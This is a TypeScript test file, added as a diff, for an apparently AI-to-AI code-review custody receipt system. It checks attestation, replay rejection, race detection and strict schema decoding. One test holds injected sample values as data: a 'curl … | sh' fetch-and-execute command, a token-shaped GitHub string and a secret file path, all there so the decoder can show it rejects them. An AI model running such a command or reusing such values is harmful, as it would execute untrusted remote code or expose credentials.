@@ -1,0 +1,685 @@
+import { createHash } from "node:crypto";
+import { describe, expect, it } from "vitest";
+import type {
+  GitHubAttestationQuery,
+  GitHubAttestationVerification,
+  GitHubAttestationVerifierPort,
+} from "../src/feedback/ports/github-attestation-verifier.ts";
+import type { VerifiedProviderIdentity } from "../src/feedback/ports/provider-family-authority.ts";
+import { analyzeReviewDispatch } from "../src/feedback/review-dispatch.ts";
+import {
+  admitReviewCustody,
+  buildReviewCustodyReceipt,
+  type CustodyAdmissionInput,
+  type CustodyObservations,
+  type CustodyPullRequestFacts,
+  type CustodyReceiptDraft,
+  type CustodySubjectExpectation,
+  decodeReviewCustodyReceipt,
+  REVIEW_CUSTODY_SCHEMA_VERSION,
+} from "../src/feedback/review-custody.ts";
+import {
+  canonicalize,
+  computeReviewRevision,
+  type ReviewRequestIdentity,
+  sha256Hex,
+} from "../src/feedback/review-custody-canonical.ts";
+
+const REPOSITORY = "unison-ai-product/UT-TDD_AGENT-HARNESS";
+const HEAD = "a".repeat(40);
+const OTHER_HEAD = "b".repeat(40);
+const WORKFLOW_SHA = "c".repeat(40);
+const MERGE_SHA = "d".repeat(40);
+const PLAN_REVISION = "1".repeat(64);
+const JUDGMENT_DIGEST = "2".repeat(64);
+const PROVIDER_EVIDENCE_REF = `d3b:${"3".repeat(64)}`;
+const WORKFLOW_REF = `${REPOSITORY}/.github/workflows/review-attestation.yml@refs/heads/main`;
+const ISSUER = "https://token.actions.githubusercontent.com";
+const RUN_ID = "17123456789";
+
+const REQUEST_IDENTITY: ReviewRequestIdentity = {
+  schemaVersion: "review-request/v1",
+  memoryId: "project-review-pr-283-exact-head",
+  pr: 283,
+  exactHead: HEAD,
+  authorFamily: "claude",
+};
+
+function draft(overrides: Partial<CustodyReceiptDraft> = {}): CustodyReceiptDraft {
+  return {
+    receiptKind: "pre_merge_review",
+    repository: REPOSITORY,
+    prNumber: 283,
+    baseRef: "main",
+    headSha: HEAD,
+    planId: "PLAN-L7-465-cross-review-author-binding",
+    planRevision: PLAN_REVISION,
+    requestIdentity: REQUEST_IDENTITY,
+    judgmentDigest: JUDGMENT_DIGEST,
+    workflowRef: WORKFLOW_REF,
+    workflowSha: WORKFLOW_SHA,
+    runId: RUN_ID,
+    runAttempt: 1,
+    issuer: ISSUER,
+    providerEvidenceRef: PROVIDER_EVIDENCE_REF,
+    reviewerFamily: "codex",
+    authorFamily: "claude",
+    verdict: "PASS",
+    blockingFindingCount: 0,
+    ...overrides,
+  };
+}
+
+function buildText(overrides: Partial<CustodyReceiptDraft> = {}): string {
+  const built = buildReviewCustodyReceipt({ draft: draft(overrides), attempts: 3 });
+  if (!built.ok) throw new Error(`fixture receipt build failed: ${built.detail}`);
+  return built.text;
+}
+
+function prFacts(overrides: Partial<CustodyPullRequestFacts> = {}): CustodyPullRequestFacts {
+  return {
+    repository: REPOSITORY,
+    prNumber: 283,
+    baseRef: "main",
+    headSha: HEAD,
+    state: "OPEN",
+    mergeSha: null,
+    ...overrides,
+  };
+}
+
+function observations(overrides: Partial<CustodyObservations> = {}): CustodyObservations {
+  return {
+    eventPayload: prFacts(),
+    apiRead1: prFacts(),
+    apiRead2: prFacts(),
+    run: {
+      repository: REPOSITORY,
+      runId: RUN_ID,
+      runAttempt: 1,
+      workflowRef: WORKFLOW_REF,
+      workflowSha: WORKFLOW_SHA,
+      headSha: HEAD,
+      status: "completed",
+      conclusion: "success",
+    },
+    ...overrides,
+  };
+}
+
+function expectation(overrides: Partial<CustodySubjectExpectation> = {}): CustodySubjectExpectation {
+  return {
+    repository: REPOSITORY,
+    prNumber: 283,
+    baseRef: "main",
+    headSha: HEAD,
+    receiptKind: "pre_merge_review",
+    planId: "PLAN-L7-465-cross-review-author-binding",
+    planRevision: PLAN_REVISION,
+    requestIdentity: REQUEST_IDENTITY,
+    judgmentDigest: JUDGMENT_DIGEST,
+    workflowRef: WORKFLOW_REF,
+    issuer: ISSUER,
+    ...overrides,
+  };
+}
+
+function acceptingVerifier(overrides: Partial<GitHubAttestationFactsShape> = {}): {
+  port: GitHubAttestationVerifierPort;
+  queries: GitHubAttestationQuery[];
+} {
+  const queries: GitHubAttestationQuery[] = [];
+  const port: GitHubAttestationVerifierPort = {
+    verify(query) {
+      queries.push(query);
+      return Promise.resolve({
+        ok: true,
+        facts: {
+          repository: REPOSITORY,
+          workflowRef: WORKFLOW_REF,
+          workflowSha: WORKFLOW_SHA,
+          runId: RUN_ID,
+          runAttempt: 1,
+          issuer: ISSUER,
+          ...overrides,
+        },
+      });
+    },
+  };
+  return { port, queries };
+}
+
+interface GitHubAttestationFactsShape {
+  repository: string;
+  workflowRef: string;
+  workflowSha: string;
+  runId: string;
+  runAttempt: number;
+  issuer: string;
+}
+
+function rejectingVerifier(
+  reason: "missing" | "signature_unverified" | "signer_mismatch" | "audit_unavailable",
+): { port: GitHubAttestationVerifierPort; calls: () => number } {
+  let calls = 0;
+  const port: GitHubAttestationVerifierPort = {
+    verify(): Promise<GitHubAttestationVerification> {
+      calls += 1;
+      return Promise.resolve({ ok: false, reason });
+    },
+  };
+  return { port, calls: () => calls };
+}
+
+const APPROVED_IDENTITY: VerifiedProviderIdentity = {
+  kind: "verified_provider_identity",
+  family: "codex",
+  repository: REPOSITORY,
+  prNumber: 283,
+  headSha: HEAD,
+  authority: "po-approved-provider-oidc-subject",
+};
+
+function admissionInput(overrides: Partial<CustodyAdmissionInput> = {}): CustodyAdmissionInput {
+  return {
+    receiptText: buildText(),
+    expected: expectation(),
+    observations: observations(),
+    authority: { attestationVerifier: acceptingVerifier().port, providerIdentity: null },
+    ...overrides,
+  };
+}
+
+describe("D3 trusted custody receipt", () => {
+  it("U-RVGHA-D3C-001: 機械 custody が全て valid でも family authority 不在なら unverified_family で custody_admitted を出さない", async () => {
+    const decision = await admitReviewCustody(admissionInput());
+    expect(decision).toEqual({
+      state: "custody_rejected",
+      reasons: ["unverified_family"],
+      details: ["provider_family_authority_absent"],
+    });
+  });
+
+  it("U-RVGHA-D3C-017: 承認済み VerifiedProviderIdentity と全検証 green のときだけ typed custody_admitted を返す", async () => {
+    const decision = await admitReviewCustody(
+      admissionInput({
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(decision.state).toBe("custody_admitted");
+    if (decision.state !== "custody_admitted") return;
+    expect(decision.repository).toBe(REPOSITORY);
+    expect(decision.prNumber).toBe(283);
+    expect(decision.headSha).toBe(HEAD);
+    expect(decision.runId).toBe(RUN_ID);
+    expect(decision.runAttempt).toBe(1);
+    expect(decision.issuer).toBe(ISSUER);
+    expect(decision.judgmentDigest).toBe(JUDGMENT_DIGEST);
+    expect(decision.reviewRevision).toMatch(/^rv1-[0-9a-f]{64}$/);
+    expect(decision.artifactDigest).toBe(sha256Hex(buildText()));
+    expect(decision.familyAuthority).toBe("po-approved-provider-oidc-subject");
+  });
+
+  it("U-RVGHA-D3C-002: repository / PR / baseRef / headSha / planRevision / reviewRevision の 1 軸変異を全件 replay 拒否する", async () => {
+    const mutations: CustodySubjectExpectation[] = [
+      expectation({ repository: "attacker/UT-TDD_AGENT-HARNESS" }),
+      expectation({ prNumber: 284 }),
+      expectation({ baseRef: "release" }),
+      expectation({ headSha: OTHER_HEAD }),
+      expectation({ planRevision: "9".repeat(64) }),
+      expectation({
+        requestIdentity: { ...REQUEST_IDENTITY, memoryId: "project-other-review-request" },
+      }),
+    ];
+    const decisions = await Promise.all(
+      mutations.map((expected) =>
+        admitReviewCustody(
+          admissionInput({
+            expected,
+            authority: {
+              attestationVerifier: acceptingVerifier().port,
+              providerIdentity: APPROVED_IDENTITY,
+            },
+          }),
+        ),
+      ),
+    );
+    expect(decisions.map((decision) => decision.state)).toEqual(
+      mutations.map(() => "custody_rejected"),
+    );
+    for (const decision of decisions) {
+      expect(decision.state === "custody_rejected" && decision.reasons).toEqual([
+        "identity_mismatch",
+      ]);
+    }
+  });
+
+  it("U-RVGHA-D3C-003: unknown field / 必須 field 欠落 / 型違い / schemaVersion 差替えを strict decode で receipt_corrupt にする", () => {
+    const valid = JSON.parse(buildText()) as Record<string, unknown>;
+    const corrupted: Record<string, unknown>[] = [
+      { ...valid, extraField: "unexpected" },
+      Object.fromEntries(Object.entries(valid).filter(([key]) => key !== "issuer")),
+      { ...valid, prNumber: "283" },
+      { ...valid, schemaVersion: "review-custody/v2" },
+    ];
+    const outcomes = corrupted.map((entry) => decodeReviewCustodyReceipt(JSON.stringify(entry)));
+    expect(outcomes.map((outcome) => outcome.ok)).toEqual([false, false, false, false]);
+    for (const outcome of outcomes) {
+      expect(outcome.ok === false && outcome.reason).toBe("receipt_corrupt");
+    }
+    expect(decodeReviewCustodyReceipt("{not json").ok).toBe(false);
+    expect(decodeReviewCustodyReceipt(REVIEW_CUSTODY_SCHEMA_VERSION).ok).toBe(false);
+  });
+
+  it("U-RVGHA-D3C-004: reviewerFamily の自己申告を trusted へ昇格せず unverified_family にする", async () => {
+    const decision = await admitReviewCustody(
+      admissionInput({
+        receiptText: buildText({ reviewerFamily: "claude" }),
+        authority: { attestationVerifier: acceptingVerifier().port, providerIdentity: null },
+      }),
+    );
+    expect(decision).toEqual({
+      state: "custody_rejected",
+      reasons: ["unverified_family"],
+      details: ["provider_family_authority_absent"],
+    });
+    const mismatched = await admitReviewCustody(
+      admissionInput({
+        receiptText: buildText({ reviewerFamily: "claude" }),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(mismatched).toEqual({
+      state: "custody_rejected",
+      reasons: ["unverified_family"],
+      details: ["provider_family_identity_not_bound_to_subject"],
+    });
+  });
+
+  it("U-RVGHA-D3C-005: attestation だけ / D3b payload だけの片面では custody_admitted を出さない", async () => {
+    const attestationOnly = await admitReviewCustody(
+      admissionInput({
+        receiptText: JSON.stringify(
+          Object.fromEntries(
+            Object.entries(JSON.parse(buildText()) as Record<string, unknown>).filter(
+              ([key]) => key !== "providerEvidenceRef",
+            ),
+          ),
+        ),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(attestationOnly).toEqual({
+      state: "custody_rejected",
+      reasons: ["receipt_corrupt"],
+      details: ["receipt_field_set_mismatch"],
+    });
+    const payloadOnly = await admitReviewCustody(
+      admissionInput({
+        authority: {
+          attestationVerifier: rejectingVerifier("missing").port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(payloadOnly).toEqual({
+      state: "custody_rejected",
+      reasons: ["missing"],
+      details: ["attestation_missing"],
+    });
+  });
+
+  it("U-RVGHA-D3C-006: event payload と API read 1 の repo / PR / base / head 変異を発行 0 にする", async () => {
+    const mutations: CustodyPullRequestFacts[] = [
+      prFacts({ repository: "fork/UT-TDD_AGENT-HARNESS" }),
+      prFacts({ prNumber: 284 }),
+      prFacts({ baseRef: "release" }),
+      prFacts({ headSha: OTHER_HEAD }),
+    ];
+    const decisions = await Promise.all(
+      mutations.map((eventPayload) =>
+        admitReviewCustody(
+          admissionInput({
+            observations: observations({ eventPayload }),
+            authority: {
+              attestationVerifier: acceptingVerifier().port,
+              providerIdentity: APPROVED_IDENTITY,
+            },
+          }),
+        ),
+      ),
+    );
+    expect(decisions.map((decision) => decision.state)).toEqual(
+      mutations.map(() => "custody_rejected"),
+    );
+    for (const decision of decisions) {
+      const reason = decision.state === "custody_rejected" ? decision.reasons[0] : "custody";
+      expect(["head_raced", "identity_mismatch"]).toContain(reason);
+    }
+  });
+
+  it("U-RVGHA-D3C-007: API read 1 の後・read 2 の前に HEAD / state が変わった TOCTOU を head_raced で拒否する", async () => {
+    const headMoved = await admitReviewCustody(
+      admissionInput({
+        observations: observations({ apiRead2: prFacts({ headSha: OTHER_HEAD }) }),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(headMoved).toEqual({
+      state: "custody_rejected",
+      reasons: ["head_raced"],
+      details: ["api_read_1_disagrees_with_api_read_2"],
+    });
+    const stateMoved = await admitReviewCustody(
+      admissionInput({
+        observations: observations({
+          apiRead2: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
+        }),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(stateMoved.state === "custody_rejected" && stateMoved.reasons).toEqual(["head_raced"]);
+  });
+
+  it("U-RVGHA-D3C-008: fork / 別 repo / 別 PR、pre receipt への merged fact、post receipt の mergeSha 欠落を kind 不整合として拒否する", async () => {
+    const mergedUnderPre = await admitReviewCustody(
+      admissionInput({
+        observations: observations({
+          eventPayload: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
+          apiRead1: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
+          apiRead2: prFacts({ state: "MERGED", mergeSha: MERGE_SHA }),
+        }),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(mergedUnderPre).toEqual({
+      state: "custody_rejected",
+      reasons: ["identity_mismatch"],
+      details: ["pre_merge_requires_open_pull_request"],
+    });
+
+    const postWithoutMergeSha = buildReviewCustodyReceipt({
+      draft: draft({ receiptKind: "post_merge_closure", mergeMethod: "squash" }),
+      attempts: 3,
+    });
+    expect(postWithoutMergeSha.ok).toBe(false);
+    expect(postWithoutMergeSha.ok === false && postWithoutMergeSha.reason).toBe("receipt_corrupt");
+
+    const forkSubject = await admitReviewCustody(
+      admissionInput({
+        receiptText: buildText({ repository: "fork/UT-TDD_AGENT-HARNESS" }),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(forkSubject.state === "custody_rejected" && forkSubject.reasons).toEqual([
+      "identity_mismatch",
+    ]);
+  });
+
+  it("U-RVGHA-D3C-009: CI evidence の失敗系は D1 merge_ready を 0 にするが、正規 receipt の custody 判定を変えない", async () => {
+    const request = {
+      memoryId: REQUEST_IDENTITY.memoryId,
+      pr: 283,
+      exactHead: HEAD,
+      reviewRevision: "rev-1",
+      authorFamily: "claude" as const,
+      requestedAt: "2026-08-07T00:00:00Z",
+    };
+    const receipt = {
+      memoryId: REQUEST_IDENTITY.memoryId,
+      pr: 283,
+      head: HEAD,
+      reviewRevision: "rev-1",
+      reviewerFamily: "codex" as const,
+      kind: "verdict" as const,
+      verdict: "PASS" as const,
+      at: "2026-08-07T00:10:00Z",
+    };
+    const dispatched = analyzeReviewDispatch({
+      requests: [request],
+      receipts: [receipt],
+      prs: [{ pr: 283, headSha: HEAD, state: "OPEN", checksGreen: false }],
+      now: "2026-08-07T00:20:00Z",
+    });
+    expect(dispatched.entries.map((entry) => entry.state)).not.toContain("merge_ready");
+
+    const custody = await admitReviewCustody(
+      admissionInput({
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(custody.state).toBe("custody_admitted");
+  });
+
+  it("U-RVGHA-D3C-011: attestation 不在 / 署名不正 / issuer 不一致 / 取得不能を typed に区別する", async () => {
+    const cases = [
+      { reason: "missing" as const, detail: "attestation_missing" },
+      { reason: "signature_unverified" as const, detail: "attestation_signature_unverified" },
+      { reason: "signer_mismatch" as const, detail: "attestation_signer_mismatch" },
+      { reason: "audit_unavailable" as const, detail: "attestation_audit_unavailable" },
+    ];
+    for (const entry of cases) {
+      const decision = await admitReviewCustody(
+        admissionInput({
+          authority: {
+            attestationVerifier: rejectingVerifier(entry.reason).port,
+            providerIdentity: APPROVED_IDENTITY,
+          },
+        }),
+      );
+      expect(decision).toEqual({
+        state: "custody_rejected",
+        reasons: [entry.reason],
+        details: [entry.detail],
+      });
+    }
+    const factsDrift = await admitReviewCustody(
+      admissionInput({
+        authority: {
+          attestationVerifier: acceptingVerifier({ runId: "999" }).port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(factsDrift).toEqual({
+      state: "custody_rejected",
+      reasons: ["signer_mismatch"],
+      details: ["attestation_facts_disagree_with_receipt"],
+    });
+  });
+
+  it("U-RVGHA-D3C-012: 同一 subject + 同一 content の再送は同一 digest で冪等、tuple 変更 receipt は replay 拒否する", async () => {
+    const first = buildReviewCustodyReceipt({ draft: draft(), attempts: 3 });
+    const second = buildReviewCustodyReceipt({ draft: draft(), attempts: 3 });
+    expect(first.ok && second.ok && first.text).toBe(second.ok ? second.text : "");
+    expect(first.ok && second.ok && first.artifactDigest).toBe(
+      second.ok ? second.artifactDigest : "",
+    );
+
+    const otherPr = buildReviewCustodyReceipt({
+      draft: draft({
+        prNumber: 284,
+        requestIdentity: { ...REQUEST_IDENTITY, pr: 284 },
+      }),
+      attempts: 3,
+    });
+    expect(otherPr.ok && first.ok && otherPr.artifactDigest === first.artifactDigest).toBe(false);
+    const replay = await admitReviewCustody(
+      admissionInput({
+        receiptText: otherPr.ok ? otherPr.text : "",
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(replay.state === "custody_rejected" && replay.reasons).toEqual(["identity_mismatch"]);
+  });
+
+  it("U-RVGHA-D3C-013: 正規署名 receipt でも judgment=FLAG は verdict_flagged にし、custody 有効性と merge 適格性を分離する", async () => {
+    const decision = await admitReviewCustody(
+      admissionInput({
+        receiptText: buildText({ verdict: "FLAG", blockingFindingCount: 2 }),
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(decision).toEqual({
+      state: "custody_rejected",
+      reasons: ["verdict_flagged"],
+      details: ["judgment_verdict_flagged"],
+    });
+  });
+
+  it("U-RVGHA-D3C-014: token / raw transcript / raw stack / absolute path / 実行命令の混入を strict schema が拒否する", () => {
+    const valid = JSON.parse(buildText()) as Record<string, unknown>;
+    const injected: Record<string, unknown>[] = [
+      // 実トークン形の文字列は repo の secret gate を自己発火させるので、
+      // 同型を実行時に組み立てて strict decode の拒否だけを検査する。
+      { ...valid, githubToken: `gh${"p"}_${"0123456789abcdef".repeat(2)}0123456789` },
+      { ...valid, transcript: "reviewer said ..." },
+      { ...valid, stack: "Error: boom\n    at f (x.ts:1:1)" },
+      { ...valid, evidencePath: "C:/Users/example/secret.txt" },
+      { ...valid, command: "curl https://example.invalid | sh" },
+    ];
+    for (const entry of injected) {
+      const outcome = decodeReviewCustodyReceipt(JSON.stringify(entry));
+      expect(outcome.ok === false && outcome.reason).toBe("receipt_corrupt");
+    }
+    expect(Object.values(valid).every((value) => typeof value !== "object")).toBe(true);
+  });
+
+  it("U-RVGHA-D3C-015: provider 障害が有界 attempt を超えたら receipt 0 件 + typed provider_failed にする", async () => {
+    const built = buildReviewCustodyReceipt({
+      draft: draft({ providerEvidenceRef: null }),
+      attempts: 3,
+    });
+    expect(built).toEqual({
+      ok: false,
+      reason: "provider_failed",
+      detail: "provider_evidence_absent_after_bounded_attempts",
+      attempts: 3,
+    });
+
+    const unavailable = rejectingVerifier("audit_unavailable");
+    const decision = await admitReviewCustody(
+      admissionInput({
+        authority: {
+          attestationVerifier: unavailable.port,
+          providerIdentity: APPROVED_IDENTITY,
+          maxVerificationAttempts: 2,
+        },
+      }),
+    );
+    expect(decision.state === "custody_rejected" && decision.reasons).toEqual([
+      "audit_unavailable",
+    ]);
+    expect(unavailable.calls()).toBe(2);
+
+    const runFailures = ["failure", "cancelled", "skipped"] as const;
+    for (const conclusion of runFailures) {
+      const failed = await admitReviewCustody(
+        admissionInput({
+          observations: observations({
+            run: { ...observations().run, conclusion },
+          }),
+          authority: {
+            attestationVerifier: acceptingVerifier().port,
+            providerIdentity: APPROVED_IDENTITY,
+          },
+        }),
+      );
+      expect(failed).toEqual({
+        state: "custody_rejected",
+        reasons: ["provider_failed"],
+        details: [`workflow_run_not_successful:completed:${conclusion}`],
+      });
+    }
+  });
+
+  it("U-RVGHA-D3C-016: custody_admitted は CI / merge 由来 field を持たず、merge_ready の第二 SSoT にならない", async () => {
+    const decision = await admitReviewCustody(
+      admissionInput({
+        authority: {
+          attestationVerifier: acceptingVerifier().port,
+          providerIdentity: APPROVED_IDENTITY,
+        },
+      }),
+    );
+    expect(decision.state).toBe("custody_admitted");
+    expect(Object.keys(decision).sort()).toEqual(
+      [
+        "artifactDigest",
+        "familyAuthority",
+        "headSha",
+        "issuer",
+        "judgmentDigest",
+        "prNumber",
+        "receiptDigest",
+        "receiptKind",
+        "repository",
+        "reviewRevision",
+        "reviewerFamily",
+        "runAttempt",
+        "runId",
+        "state",
+        "workflowRef",
+        "workflowSha",
+      ].sort(),
+    );
+  });
+
+  it("U-RVGHA-D3C-018: RFC 8785 preimage は key 順・locale に依存せず 64 lowerhex で一致し、既存 16 桁 digest を拒否する", () => {
+    const keyOrderA = canonicalize({ b: 1, a: "x", c: [1, 2] });
+    const keyOrderB = canonicalize({ c: [1, 2], a: "x", b: 1 });
+    expect(keyOrderA).toEqual({ ok: true, value: '{"a":"x","b":1,"c":[1,2]}' });
+    expect(keyOrderB).toEqual(keyOrderA);
+
+    // locale 照合では "a" < "B" になるが、JCS は UTF-16 code unit 順なので "B" が先に来る。
+    expect(canonicalize({ a: 1, B: 2 })).toEqual({ ok: true, value: '{"B":2,"a":1}' });
+    expect(["a", "B"].sort((left, right) => left.localeCompare(right))).toEqual(["a", "B"]);
+
+    const identityCanonical =
+      '{"authorFamily":"claude","exactHead":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",' +
+      '"memoryId":"project-review-pr-283-exact-head","pr":283,"schemaVersion":"review-request/v1"}';
+    const independentDigest = createHash("sha256").update(identityCanonical, "utf8").digest("hex");
+    const revision = computeReviewRevision(REQUEST_IDENTITY);
+    expect(revision).toEqual({ ok: true, value: `rv1-${independentDigest}` });
+    expect(independentDigest).toHaveLength(64);
+
+    const receipt = JSON.parse(buildText()) as Record<string, unknown>;
+    expect(String(receipt.receiptDigest)).toHaveLength(64);
+    const truncated = { ...receipt, receiptDigest: String(receipt.receiptDigest).slice(0, 16) };
+    expect(decodeReviewCustodyReceipt(JSON.stringify(truncated)).ok).toBe(false);
+    const wellFormedButWrong = { ...receipt, receiptDigest: "f".repeat(64) };
+    const outcome = decodeReviewCustodyReceipt(JSON.stringify(wellFormedButWrong));
+    expect(outcome.ok === false && outcome.reason).toBe("identity_mismatch");
+    expect(canonicalize({ n: 1.5 })).toEqual({ ok: false, reason: "canonical_unsupported_value" });
+  });
+});
